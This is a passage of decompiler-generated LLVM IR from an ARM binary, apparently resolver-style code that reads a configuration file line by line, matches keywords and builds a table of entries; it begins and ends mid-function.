  uselistorder i8* %v1_16eb4, { 1, 0 }
  uselistorder i32 %v2_16ee0, { 0, 2, 3, 1 }
  uselistorder i1 %v2_16ecc, { 1, 0 }
  uselistorder i8 %v2_16eb416, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 0, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 4, 2, 0, 3, 1 }
  uselistorder i16 0, { 0, 7, 1, 2, 8, 3, 4, 5, 6, 9 }
  uselistorder i32 920, { 0, 3, 4, 5, 6, 2, 1, 7 }
  uselistorder label %dec_label_pc_16ee8, { 0, 2, 1, 3 }
  uselistorder label %bb7, { 1, 0 }
  uselistorder label %dec_label_pc_16ec4, { 1, 0 }
}

define i32 @function_16ef8() local_unnamed_addr {
dec_label_pc_16ef8:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp47 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-544 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-304 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-68 = alloca i16, align 2
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-560 = alloca i8*, align 4
  %v3_16ef8 = load i32, i32* @r4, align 4
  %v15_16ef8 = load i32, i32* @r8, align 4
  %v18_16ef8 = load i32, i32* @sb, align 4
  %v21_16ef8 = load i32, i32* @sl, align 4
  %v24_16ef8 = load i32, i32* @fp, align 4
  store i32 12308, i32* %r3.global-to-local, align 4
  store i32 142964, i32* @r5, align 4
  %v4_16f08 = load i32, i32* @global_var_25e88.684, align 4
  store i32 %v4_16f08, i32* @r4, align 4
  %v2_16f0c = icmp eq i32 %v4_16f08, 0
  br i1 %v2_16f0c, label %dec_label_pc_16f18, label %dec_label_pc_16f48

dec_label_pc_16f18:                               ; preds = %dec_label_pc_16ef8
  %v2_16f1c = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v2_16f1c, i32* %r1.global-to-local, align 4
  %v3_16f24 = call i32 @function_17848(i32 ptrtoint ([17 x i8]* @global_var_1add0.686 to i32), i32 %v2_16f1c)
  %v2_16f28 = icmp eq i32 %v3_16f24, 0
  %v1_16f2c = load i32, i32* @r4, align 4
  %.v1_16f2c = select i1 %v2_16f28, i32 %tmp47, i32 %v1_16f2c
  store i32 10784, i32* %r1.global-to-local, align 4
  store i32 %.v1_16f2c, i32* %r2.global-to-local, align 4
  %v0_16f38 = load i32, i32* @r5, align 4
  %v2_16f38 = add i32 %v0_16f38, 10784
  %v3_16f38 = inttoptr i32 %v2_16f38 to i32*
  %v4_16f38 = load i32, i32* %v3_16f38, align 4
  store i32 %v4_16f38, i32* %r3.global-to-local, align 4
  %v9_16f3c = icmp eq i32 %v4_16f38, %.v1_16f2c
  br i1 %v9_16f3c, label %.thread, label %dec_label_pc_17354

.thread:                                          ; preds = %dec_label_pc_16f18
  store i32 94024, i32* @lr, align 4
  br label %dec_label_pc_16f48

dec_label_pc_16f48:                               ; preds = %.thread, %dec_label_pc_16ef8
  %v2_16f60 = phi i32 [ %v0_16f38, %.thread ], [ 142964, %dec_label_pc_16ef8 ]
  store i32 12320, i32* %r3.global-to-local, align 4
  %v2_16f4c = add i32 %v2_16f60, 12320
  %v3_16f4c = inttoptr i32 %v2_16f4c to i32*
  %v4_16f4c = load i32, i32* %v3_16f4c, align 4
  store i32 %v4_16f4c, i32* %r3.global-to-local, align 4
  %v2_16f50 = icmp eq i32 %v4_16f4c, 0
  br i1 %v2_16f50, label %dec_label_pc_16f58, label %dec_label_pc_172ec

dec_label_pc_16f58:                               ; preds = %dec_label_pc_16f48
  %v4_16f60 = add i32 %v2_16f60, 934
  %v5_16f60 = inttoptr i32 %v4_16f60 to i8*
  store i8 5, i8* %v5_16f60, align 1
  store i32 935, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v2_16f74 = load i32, i32* @r5, align 4
  %v4_16f74 = add i32 %v2_16f74, 935
  %v5_16f74 = inttoptr i32 %v4_16f74 to i8*
  store i8 3, i8* %v5_16f74, align 1
  store i32 ptrtoint ([17 x i8]* @global_var_1add0.686 to i32), i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1a714.599 to i32), i32* @r1, align 4
  %v3_16f80 = call i32 @function_d2bc(i32 ptrtoint ([17 x i8]* @global_var_1add0.686 to i32), i32 ptrtoint (i32* @global_var_1a714.599 to i32))
  store i32 %v3_16f80, i32* @fp, align 4
  %v2_16f84 = icmp eq i32 %v3_16f80, 0
  br i1 %v2_16f84, label %dec_label_pc_17210, label %dec_label_pc_171b8

dec_label_pc_16f90:                               ; preds = %dec_label_pc_171b8, %dec_label_pc_171ec.backedge
  %v2_16f94 = call i32 @function_16ea0(i8* %v1_16f94)
  store i32 %v2_16f94, i32* @r4, align 4
  %v0_16f9c = call i32 @function_16e4c()
  %v1_16fa0 = inttoptr i32 %v0_16f9c to i8*
  %v2_16fa0 = call i32 @function_16ea0(i8* %v1_16fa0)
  store i32 ptrtoint ([11 x i8]* @global_var_1ade4.699 to i32), i32* @r1, align 4
  store i32 %v2_16fa0, i32* @r7, align 4
  %v0_16fac = load i32, i32* @r4, align 4
  %v3_16fb0 = inttoptr i32 %v0_16fac to i8*
  %v4_16fb0 = call i32 @function_f6e0(i8* %v3_16fb0, i32 ptrtoint ([11 x i8]* @global_var_1ade4.699 to i32))
  %sext = mul i32 %v4_16fb0, 16777216
  %v1_16fb4 = sdiv i32 %sext, 16777216
  store i32 %v1_16fb4, i32* @r6, align 4
  %sext.off = or i32 %sext, 16777215
  %tmp = icmp ult i32 %sext.off, 33554431
  br i1 %tmp, label %dec_label_pc_16fbc, label %dec_label_pc_17078

dec_label_pc_16fbc:                               ; preds = %dec_label_pc_16f90
  %v0_16fc0 = call i32 @function_16e4c()
  %v1_16fc0 = inttoptr i32 %v0_16fc0 to i8*
  store i32 %v2_16fc4, i32* @r4, align 4
  %v0_16fc8 = load i32, i32* @r6, align 4
  %v1_16fc8 = trunc i32 %v0_16fc8 to i8
  store i8 %v1_16fc8, i8* %v1_16fc0, align 1
  %v0_16fcc = load i32, i32* @r6, align 4
  store i32 %v0_16fcc, i32* %r1.global-to-local, align 4
  store i32 28, i32* @r2, align 4
  %v3_16fd8 = call i32 @function_f5d0(i8* %v2_16fd8, i32 %v0_16fcc)
  %v0_16fe0 = load i32, i32* @r7, align 4
  store i32 %v0_16fe0, i32* %r1.global-to-local, align 4
  store i32 %v2_16fe4, i32* %r2.global-to-local, align 4
  %v3_16fe8 = inttoptr i32 %v0_16fe0 to i8*
  %v4_16fe8 = call i32 @function_15f88(i32 10, i8* %v3_16fe8, i32 %v2_16fe4)
  %tmp69 = icmp slt i32 %v4_16fe8, 1
  br i1 %tmp69, label %dec_label_pc_16ff8, label %dec_label_pc_17014

dec_label_pc_16ff8:                               ; preds = %dec_label_pc_16fbc
  %v0_16ff8 = load i32, i32* @r7, align 4
  store i32 %v0_16ff8, i32* %r1.global-to-local, align 4
  store i32 %v2_16ffc, i32* %r2.global-to-local, align 4
  %v3_17004 = inttoptr i32 %v0_16ff8 to i8*
  %v4_17004 = call i32 @function_15f88(i32 2, i8* %v3_17004, i32 %v2_16ffc)
  %tmp70 = icmp slt i32 %v4_17004, 1
  br i1 %tmp70, label %dec_label_pc_171ec.backedge, label %dec_label_pc_17014

dec_label_pc_17014:                               ; preds = %dec_label_pc_16ff8, %dec_label_pc_16fbc
  %v0_17018.off0 = phi i16 [ 10, %dec_label_pc_16fbc ], [ 2, %dec_label_pc_16ff8 ]
  store i32 %v2_17014, i32* %r2.global-to-local, align 4
  store i16 %v0_17018.off0, i16* %stack_var_-68, align 2
  store i32 13568, i32* %r3.global-to-local, align 4
  store i32 12320, i32* @r7, align 4
  %v0_17028 = load i32, i32* @r5, align 4
  %v2_17028 = add i32 %v0_17028, 12320
  %v3_17028 = inttoptr i32 %v2_17028 to i32*
  %v4_17028 = load i32, i32* %v3_17028, align 4
  store i32 12316, i32* @sl, align 4
  %v1_17030 = add i32 %v4_17028, 1
  store i32 %v1_17030, i32* %r3.global-to-local, align 4
  store i32 28, i32* @r8, align 4
  %v2_17038 = mul i32 %v1_17030, 28
  store i32 %v2_17038, i32* %r1.global-to-local, align 4
  %v4_1703c = load i32, i32* @global_var_25e90.674, align 4
  %v2_17040 = inttoptr i32 %v4_1703c to i32*
  %v3_17040 = call i32 @function_10a30(i32* %v2_17040, i32 %v2_17038)
  store i32 %v3_17040, i32* @r6, align 4
  %v2_17044 = icmp eq i32 %v3_17040, 0
  br i1 %v2_17044, label %dec_label_pc_171ec.backedge, label %dec_label_pc_1704c

dec_label_pc_1704c:                               ; preds = %dec_label_pc_17014
  %v0_1704c = load i32, i32* @r5, align 4
  %v1_1704c = load i32, i32* @r7, align 4
  %v2_1704c = add i32 %v1_1704c, %v0_1704c
  %v3_1704c = inttoptr i32 %v2_1704c to i32*
  %v4_1704c = load i32, i32* %v3_1704c, align 4
  store i32 %v4_1704c, i32* %r4.global-to-local, align 4
  %v1_17050 = load i32, i32* @r8, align 4
  %v3_17050 = mul i32 %v1_17050, %v4_1704c
  %v4_17050 = add i32 %v3_17050, %v3_17040
  %v2_17058 = load i16, i16* %stack_var_-68, align 2
  %v3_17058 = sext i16 %v2_17058 to i32
  %v6_17058 = load i32, i32* %stack_var_-64, align 4
  store i32 %v6_17058, i32* %r1.global-to-local, align 4
  %v9_17058 = load i32, i32* %stack_var_-60, align 4
  store i32 %v9_17058, i32* %r2.global-to-local, align 4
  store i32 %v14_17058, i32* @ip, align 4
  store i32 %v3_17040, i32* @global_var_25e90.674, align 4
  %v1_17060 = inttoptr i32 %v4_17050 to i32*
  store i32 %v3_17058, i32* %v1_17060, align 4
  %v3_17060 = add i32 %v4_17050, 4
  %v4_17060 = inttoptr i32 %v3_17060 to i32*
  %v5_17060 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_17060, i32* %v4_17060, align 4
  %v6_17060 = add i32 %v4_17050, 8
  %v7_17060 = inttoptr i32 %v6_17060 to i32*
  %v8_17060 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_17060, i32* %v7_17060, align 4
  %v9_17060 = add i32 %v4_17050, 12
  %v10_17060 = inttoptr i32 %v9_17060 to i32*
  %v11_17060 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_17060, i32* %v10_17060, align 4
  %v12_17060 = add i32 %v4_17050, 16
  store i32 %v12_17060, i32* @lr, align 4
  %v2_17064 = load i32, i32* %stack_var_-52, align 4
  %v0_17068 = load i32, i32* %r4.global-to-local, align 4
  %v1_17068 = add i32 %v0_17068, 1
  store i32 %v1_17068, i32* %r4.global-to-local, align 4
  %v1_1706c = inttoptr i32 %v12_17060 to i32*
  store i32 %v2_17064, i32* %v1_1706c, align 4
  %v3_1706c = add i32 %v4_17050, 20
  %v4_1706c = inttoptr i32 %v3_1706c to i32*
  %v5_1706c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1706c, i32* %v4_1706c, align 4
  %v6_1706c = add i32 %v4_17050, 24
  %v7_1706c = inttoptr i32 %v6_1706c to i32*
  %v8_1706c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_1706c, i32* %v7_1706c, align 4
  %v0_17070 = load i32, i32* %r4.global-to-local, align 4
  %v1_17070 = load i32, i32* @r5, align 4
  %v2_17070 = load i32, i32* @r7, align 4
  %v3_17070 = add i32 %v2_17070, %v1_17070
  %v4_17070 = inttoptr i32 %v3_17070 to i32*
  store i32 %v0_17070, i32* %v4_17070, align 4
  br label %dec_label_pc_171ec.backedge

dec_label_pc_171ec.backedge:                      ; preds = %dec_label_pc_17114, %dec_label_pc_17104, %dec_label_pc_170d0, %dec_label_pc_1704c, %dec_label_pc_171a4, %dec_label_pc_16ff8, %dec_label_pc_17014, %dec_label_pc_1714c, %dec_label_pc_17154, %dec_label_pc_17138, %dec_label_pc_17188
  %v0_171f8.pre = load i32, i32* @fp, align 4
  store i32 %v2_171ec, i32* @r4, align 4
  store i32 128, i32* %r1.global-to-local, align 4
  store i32 %v0_171f8.pre, i32* %r2.global-to-local, align 4
  %v3_171fc = call i32 @function_ed48(i32 %v2_171ec, i32 128, i32 %v0_171f8.pre)
  %v2_17200 = icmp eq i32 %v3_171fc, 0
  br i1 %v2_17200, label %dec_label_pc_17208, label %dec_label_pc_16f90

dec_label_pc_17078:                               ; preds = %dec_label_pc_16f90
  %v0_17078 = load i32, i32* @r4, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1adf0.701 to i32), i32* @r1, align 4
  %v3_17080 = inttoptr i32 %v0_17078 to i8*
  %v4_17080 = call i32 @function_f6e0(i8* %v3_17080, i32 ptrtoint ([7 x i8]* @global_var_1adf0.701 to i32))
  %v2_17084 = icmp eq i32 %v4_17080, 0
  br i1 %v2_17084, label %dec_label_pc_170b8, label %dec_label_pc_1708c

dec_label_pc_1708c:                               ; preds = %dec_label_pc_17078
  %v0_1708c = load i32, i32* @r4, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1adf8.703 to i32), i32* @r1, align 4
  %v3_17094 = inttoptr i32 %v0_1708c to i8*
  %v4_17094 = call i32 @function_f6e0(i8* %v3_17094, i32 ptrtoint ([7 x i8]* @global_var_1adf8.703 to i32))
  %v2_17098 = icmp eq i32 %v4_17094, 0
  br i1 %v2_17098, label %dec_label_pc_170b8, label %dec_label_pc_17138

dec_label_pc_170a4:                               ; preds = %dec_label_pc_170b8, %dec_label_pc_170a4.dec_label_pc_170a4_crit_edge
  %v2_170a8 = phi i32 [ %v1_170bc, %dec_label_pc_170a4.dec_label_pc_170a4_crit_edge ], [ %v1_170bc16, %dec_label_pc_170b8 ]
  %v0_170a8 = phi i32 [ %v1_170c4, %dec_label_pc_170a4.dec_label_pc_170a4_crit_edge ], [ %v1_170c423, %dec_label_pc_170b8 ]
  %v1_170a4 = phi i32 [ %v1_170a4.pre, %dec_label_pc_170a4.dec_label_pc_170a4_crit_edge ], [ 12312, %dec_label_pc_170b8 ]
  %v1_170a8 = phi i32 [ %v0_170bc, %dec_label_pc_170a4.dec_label_pc_170a4_crit_edge ], [ %v0_170bc15, %dec_label_pc_170b8 ]
  %v2_170a4 = add i32 %v1_170a8, %v1_170a4
  %v3_170a4 = inttoptr i32 %v2_170a4 to i32*
  %v4_170a4 = load i32, i32* %v3_170a4, align 4
  store i32 %v4_170a4, i32* %r3.global-to-local, align 4
  %v3_170a8 = add i32 %v1_170a8, %v2_170a8
  %v4_170a8 = inttoptr i32 %v3_170a8 to i32*
  store i32 %v0_170a8, i32* %v4_170a8, align 4
  %v0_170ac = load i32, i32* %r3.global-to-local, align 4
  %v1_170ac = load i32, i32* %r2.global-to-local, align 4
  %v4_170ac = mul i32 %v1_170ac, 4
  %v5_170ac = add i32 %v4_170ac, %v0_170ac
  %v6_170ac = inttoptr i32 %v5_170ac to i32*
  %v7_170ac = load i32, i32* %v6_170ac, align 4
  store i32 %v7_170ac, i32* @r0, align 4
  %v0_170b0 = call i32 @function_11048()
  %v0_170bc = load i32, i32* @r5, align 4
  %v1_170bc = load i32, i32* @sb, align 4
  %v2_170bc = add i32 %v1_170bc, %v0_170bc
  %v3_170bc = inttoptr i32 %v2_170bc to i32*
  %v4_170bc = load i32, i32* %v3_170bc, align 4
  store i32 %v4_170bc, i32* %r3.global-to-local, align 4
  %v2_170c0 = icmp eq i32 %v4_170bc, 0
  %v1_170c4 = add i32 %v4_170bc, -1
  store i32 %v1_170c4, i32* %r2.global-to-local, align 4
  br i1 %v2_170c0, label %dec_label_pc_170cc, label %dec_label_pc_170a4.dec_label_pc_170a4_crit_edge

dec_label_pc_170a4.dec_label_pc_170a4_crit_edge:  ; preds = %dec_label_pc_170a4
  %v1_170a4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_170a4

dec_label_pc_170b8:                               ; preds = %dec_label_pc_1708c, %dec_label_pc_17078
  store i32 12312, i32* @r4, align 4
  %v0_170bc15 = load i32, i32* @r5, align 4
  %v1_170bc16 = load i32, i32* @sb, align 4
  %v2_170bc17 = add i32 %v1_170bc16, %v0_170bc15
  %v3_170bc18 = inttoptr i32 %v2_170bc17 to i32*
  %v4_170bc19 = load i32, i32* %v3_170bc18, align 4
  store i32 %v4_170bc19, i32* %r3.global-to-local, align 4
  %v2_170c021 = icmp eq i32 %v4_170bc19, 0
  %v1_170c423 = add i32 %v4_170bc19, -1
  store i32 %v1_170c423, i32* %r2.global-to-local, align 4
  br i1 %v2_170c021, label %dec_label_pc_170cc, label %dec_label_pc_170a4

dec_label_pc_170cc:                               ; preds = %dec_label_pc_170a4, %dec_label_pc_170b8
  store i32 12312, i32* @r6, align 4
  br label %dec_label_pc_170d0

dec_label_pc_170d0:                               ; preds = %dec_label_pc_17114, %dec_label_pc_170cc
  %v0_170d4 = call i32 @function_16e4c()
  %v1_170d8 = inttoptr i32 %v0_170d4 to i8*
  %v2_170d8 = call i32 @function_16ea0(i8* %v1_170d8)
  %v0_170dc = load i32, i32* @r5, align 4
  %v1_170dc = load i32, i32* @sb, align 4
  %v2_170dc = add i32 %v1_170dc, %v0_170dc
  %v3_170dc = inttoptr i32 %v2_170dc to i32*
  %v4_170dc = load i32, i32* %v3_170dc, align 4
  store i32 %v2_170d8, i32* @r4, align 4
  %tmp77 = mul i32 %v4_170dc, 4
  %v3_170e8 = add i32 %tmp77, 4
  store i32 %v3_170e8, i32* %r1.global-to-local, align 4
  %v4_170ec = load i32, i32* @global_var_25e8c.670, align 4
  %v2_170f0 = inttoptr i32 %v4_170ec to i32*
  %v3_170f0 = call i32 @function_10a30(i32* %v2_170f0, i32 %v3_170e8)
  store i32 %v3_170f0, i32* %r3.global-to-local, align 4
  %v2_170f4 = icmp eq i32 %v3_170f0, 0
  %v0_170f8 = load i32, i32* @r7, align 4
  %v0_170fc = load i32, i32* @r4, align 4
  store i32 %v0_170fc, i32* @r7, align 4
  br i1 %v2_170f4, label %dec_label_pc_171ec.backedge, label %dec_label_pc_17104

dec_label_pc_17104:                               ; preds = %dec_label_pc_170d0
  store i32 %v3_170f0, i32* @global_var_25e8c.670, align 4
  %v1_17108 = call i32 @function_fb80(i32 %v0_170f8)
  %v2_1710c = icmp eq i32 %v1_17108, 0
  br i1 %v2_1710c, label %dec_label_pc_171ec.backedge, label %dec_label_pc_17114

dec_label_pc_17114:                               ; preds = %dec_label_pc_17104
  %v0_17114 = load i32, i32* @r5, align 4
  %v1_17114 = load i32, i32* @sb, align 4
  %v2_17114 = add i32 %v1_17114, %v0_17114
  %v3_17114 = inttoptr i32 %v2_17114 to i32*
  %v4_17114 = load i32, i32* %v3_17114, align 4
  store i32 %v4_17114, i32* %r3.global-to-local, align 4
  %v4_17118 = load i32, i32* @global_var_25e8c.670, align 4
  store i32 %v4_17118, i32* %r2.global-to-local, align 4
  %v1_1711c = add i32 %v4_17114, 1
  store i32 %v1_1711c, i32* %r1.global-to-local, align 4
  %v5_17120 = mul i32 %v4_17114, 4
  %v6_17120 = add i32 %v4_17118, %v5_17120
  %v7_17120 = inttoptr i32 %v6_17120 to i32*
  store i32 %v1_17108, i32* %v7_17120, align 4
  %v0_17124 = load i32, i32* %r1.global-to-local, align 4
  %v1_17124 = load i32, i32* @r5, align 4
  %v2_17124 = load i32, i32* @sb, align 4
  %v3_17124 = add i32 %v2_17124, %v1_17124
  %v4_17124 = inttoptr i32 %v3_17124 to i32*
  store i32 %v0_17124, i32* %v4_17124, align 4
  %v0_17128 = load i32, i32* @r4, align 4
  %v1_17128 = inttoptr i32 %v0_17128 to i8*
  %v2_17128 = load i8, i8* %v1_17128, align 1
  %v3_17128 = zext i8 %v2_17128 to i32
  store i32 %v3_17128, i32* %r3.global-to-local, align 4
  %v2_1712c = icmp eq i8 %v2_17128, 0
  br i1 %v2_1712c, label %dec_label_pc_171ec.backedge, label %dec_label_pc_170d0

dec_label_pc_17138:                               ; preds = %dec_label_pc_1708c
  %v0_17138 = load i32, i32* @r4, align 4
  %v2_1713c = load i8*, i8** %stack_var_-560, align 4
  %v3_1713c = ptrtoint i8* %v2_1713c to i32
  store i32 %v3_1713c, i32* @r1, align 4
  %v3_17140 = inttoptr i32 %v0_17138 to i8*
  %v4_17140 = call i32 @function_f6e0(i8* %v3_17140, i32 %v3_1713c)
  %sext6 = mul i32 %v4_17140, 16777216
  %v1_17144 = sdiv i32 %sext6, 16777216
  store i32 %v1_17144, i32* @r4, align 4
  %sext6.off = or i32 %sext6, 16777215
  %tmp78 = icmp ult i32 %sext6.off, 33554431
  br i1 %tmp78, label %dec_label_pc_1714c, label %dec_label_pc_171ec.backedge

dec_label_pc_1714c:                               ; preds = %dec_label_pc_17138
  %v0_1714c = load i32, i32* @r7, align 4
  %v2_1714c = icmp eq i32 %v0_1714c, 0
  br i1 %v2_1714c, label %dec_label_pc_171ec.backedge, label %dec_label_pc_17154

dec_label_pc_17154:                               ; preds = %dec_label_pc_1714c
  store i32 %v0_1714c, i32* @r0, align 4
  store i32 58, i32* %r1.global-to-local, align 4
  %v2_1715c = call i32 @function_15078(i32 %v0_1714c, i32 58)
  store i32 %v2_1715c, i32* @r6, align 4
  %v3_17160 = icmp eq i32 %v2_1715c, 0
  br i1 %v3_17160, label %dec_label_pc_171ec.backedge, label %dec_label_pc_17168

dec_label_pc_17168:                               ; preds = %dec_label_pc_17154
  %v0_1716c = load i32, i32* @r4, align 4
  %v1_1716c = trunc i32 %v0_1716c to i8
  %v3_1716c = inttoptr i32 %v2_1715c to i8*
  store i8 %v1_1716c, i8* %v3_1716c, align 1
  store i32 ptrtoint ([8 x i8]* @global_var_1ae08.695 to i32), i32* @r1, align 4
  %v0_17174 = load i32, i32* @r7, align 4
  %v3_17178 = inttoptr i32 %v0_17174 to i8*
  %v4_17178 = call i32 @function_f6e0(i8* %v3_17178, i32 ptrtoint ([8 x i8]* @global_var_1ae08.695 to i32))
  %v2_1717c = icmp eq i32 %v4_17178, 0
  br i1 %v2_1717c, label %dec_label_pc_171a4, label %dec_label_pc_17188

dec_label_pc_17188:                               ; preds = %dec_label_pc_17168
  %v0_1718c = load i32, i32* @r7, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1ae10.697 to i32), i32* @r1, align 4
  %v3_17194 = inttoptr i32 %v0_1718c to i8*
  %v4_17194 = call i32 @function_f6e0(i8* %v3_17194, i32 ptrtoint ([9 x i8]* @global_var_1ae10.697 to i32))
  %v2_17198 = icmp eq i32 %v4_17194, 0
  br i1 %v2_17198, label %dec_label_pc_171a4, label %dec_label_pc_171ec.backedge

dec_label_pc_171a4:                               ; preds = %dec_label_pc_17188, %dec_label_pc_17168
  %storemerge = phi i32 [ 934, %dec_label_pc_17168 ], [ 935, %dec_label_pc_17188 ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v0_171a4 = load i32, i32* @r6, align 4
  %v1_171a4 = add i32 %v0_171a4, 1
  store i32 %v1_171a4, i32* @r0, align 4
  %v0_171a8 = load i32, i32* @r5, align 4
  %v2_171a8 = add i32 %v0_171a8, %storemerge
  store i32 %v2_171a8, i32* @r4, align 4
  %v1_171ac = call i32 @function_119f4(i32 %v1_171a4)
  %v2_171ac = trunc i32 %v1_171ac to i8
  %v3_171b0 = load i32, i32* @r4, align 4
  %v4_171b0 = inttoptr i32 %v3_171b0 to i8*
  store i8 %v2_171ac, i8* %v4_171b0, align 1
  br label %dec_label_pc_171ec.backedge

dec_label_pc_171b8:                               ; preds = %dec_label_pc_16f58
  store i32 ptrtoint ([8 x i8]* @global_var_1ae00.705 to i32), i32* %r3.global-to-local, align 4
  store i32 12324, i32* @sb, align 4
  store i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1ae00.705, i32 0, i32 0), i8** %stack_var_-560, align 4
  %v2_171ec = ptrtoint i32* %stack_var_-288 to i32
  %v1_16f94 = bitcast i32* %stack_var_-288 to i8*
  %v2_16fc4 = ptrtoint i16* %stack_var_-68 to i32
  %v2_16fd8 = bitcast i16* %stack_var_-68 to i8*
  %v2_16fe4 = ptrtoint i32* %stack_var_-60 to i32
  %v2_16ffc = ptrtoint i32* %stack_var_-64 to i32
  %v2_17014 = ptrtoint i32* %stack_var_-304 to i32
  %v14_17058 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_171ec, i32* @r4, align 4
  store i32 128, i32* %r1.global-to-local, align 4
  store i32 %v3_16f80, i32* %r2.global-to-local, align 4
  %v3_171fc74 = call i32 @function_ed48(i32 %v2_171ec, i32 128, i32 %v3_16f80)
  %v2_1720076 = icmp eq i32 %v3_171fc74, 0
  br i1 %v2_1720076, label %dec_label_pc_17208, label %dec_label_pc_16f90

dec_label_pc_17208:                               ; preds = %dec_label_pc_171ec.backedge, %dec_label_pc_171b8
  %v0_17208 = load i32, i32* @fp, align 4
  %v1_1720c = inttoptr i32 %v0_17208 to i16*
  %v2_1720c = call i32 @function_d108(i16* %v1_1720c)
  br label %dec_label_pc_17210

dec_label_pc_17210:                               ; preds = %dec_label_pc_16f58, %dec_label_pc_17208
  store i32 12320, i32* %r3.global-to-local, align 4
  %v0_17214 = load i32, i32* @r5, align 4
  %v2_17214 = add i32 %v0_17214, 12320
  %v3_17214 = inttoptr i32 %v2_17214 to i32*
  %v4_17214 = load i32, i32* %v3_17214, align 4
  store i32 %v4_17214, i32* %r3.global-to-local, align 4
  %v2_17218 = icmp eq i32 %v4_17214, 0
  br i1 %v2_17218, label %dec_label_pc_17220, label %dec_label_pc_1725c

dec_label_pc_17220:                               ; preds = %dec_label_pc_17210
  %v1_17224 = call i32 @function_10110(i32 28)
  store i32 -32856, i32* %r3.global-to-local, align 4
  store i32 12316, i32* %r2.global-to-local, align 4
  %v2_17230 = icmp eq i32 %v1_17224, 0
  br i1 %v2_17230, label %.thread8.thread, label %bb71

.thread8.thread:                                  ; preds = %dec_label_pc_17220
  store i32 ptrtoint (i32* @global_var_1ae1c.708 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1ae1c.708 to i32), i32* @global_var_25e90.674, align 4
  br label %.thread10

bb71:                                             ; preds = %dec_label_pc_17220
  store i32 %v1_17224, i32* @global_var_25e90.674, align 4
  %v1_1724012 = load i32, i32* @r5, align 4
  %v3_1724014 = add i32 %v1_1724012, -32856
  store i32 %v3_1724014, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  br label %.thread10

.thread10:                                        ; preds = %.thread8.thread, %bb71
  store i32 94796, i32* @lr, align 4
  %v1_17248 = xor i1 %v2_17230, true
  call void @__pseudo_cond_branch(i1 %v1_17248, i32 ptrtoint (i32* @global_var_f700.405 to i32))
  store i32 12320, i32* %r2.global-to-local, align 4
  %v0_17250 = load i32, i32* @r5, align 4
  %v2_17250 = add i32 %v0_17250, 12320
  %v3_17250 = inttoptr i32 %v2_17250 to i32*
  %v4_17250 = load i32, i32* %v3_17250, align 4
  %v1_17254 = add i32 %v4_17250, 1
  store i32 %v1_17254, i32* %r3.global-to-local, align 4
  store i32 %v1_17254, i32* %v3_17250, align 4
  %v0_17260.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1725c

dec_label_pc_1725c:                               ; preds = %dec_label_pc_17210, %.thread10
  %v0_17260 = phi i32 [ %v0_17214, %dec_label_pc_17210 ], [ %v0_17260.pre, %.thread10 ]
  store i32 12324, i32* @r7, align 4
  %v2_17260 = add i32 %v0_17260, 12324
  %v3_17260 = inttoptr i32 %v2_17260 to i32*
  %v4_17260 = load i32, i32* %v3_17260, align 4
  store i32 %v4_17260, i32* @r4, align 4
  %v2_17264 = icmp eq i32 %v4_17260, 0
  br i1 %v2_17264, label %dec_label_pc_1726c, label %dec_label_pc_172ec

dec_label_pc_1726c:                               ; preds = %dec_label_pc_1725c
  %v2_1726c = ptrtoint i32* %stack_var_-544 to i32
  store i32 %v2_1726c, i32* @r6, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_17278 = call i32 @function_1779c(i32 %v2_1726c, i32 255)
  %v2_1727c = icmp eq i32 %v2_17278, 0
  br i1 %v2_1727c, label %dec_label_pc_17288, label %dec_label_pc_172ec

dec_label_pc_17288:                               ; preds = %dec_label_pc_1726c
  store i32 %v2_1726c, i32* @r0, align 4
  store i32 46, i32* %r1.global-to-local, align 4
  %v2_17290 = call i32 @function_15078(i32 %v2_1726c, i32 46)
  %v2_17294 = icmp eq i32 %v2_17290, 0
  br i1 %v2_17294, label %dec_label_pc_172ec, label %dec_label_pc_1729c

dec_label_pc_1729c:                               ; preds = %dec_label_pc_17288
  %v1_1729c = add i32 %v2_17290, 1
  %v2_1729c = inttoptr i32 %v1_1729c to i8*
  %v3_1729c = load i8, i8* %v2_1729c, align 1
  %v4_1729c = zext i8 %v3_1729c to i32
  store i32 %v4_1729c, i32* %r3.global-to-local, align 4
  %v2_172a0 = icmp eq i8 %v3_1729c, 0
  br i1 %v2_172a0, label %dec_label_pc_172ec, label %dec_label_pc_172ac

dec_label_pc_172ac:                               ; preds = %dec_label_pc_1729c
  %v1_172ac = call i32 @function_fb80(i32 %v1_1729c)
  store i32 %v1_172ac, i32* @r4, align 4
  %v2_172b0 = icmp eq i32 %v1_172ac, 0
  br i1 %v2_172b0, label %dec_label_pc_172ec, label %dec_label_pc_172b8

dec_label_pc_172b8:                               ; preds = %dec_label_pc_172ac
  %v1_172bc = call i32 @function_10110(i32 4)
  store i32 12312, i32* %r3.global-to-local, align 4
  %v2_172c4 = icmp eq i32 %v1_172bc, 0
  store i32 %v1_172bc, i32* @global_var_25e8c.670, align 4
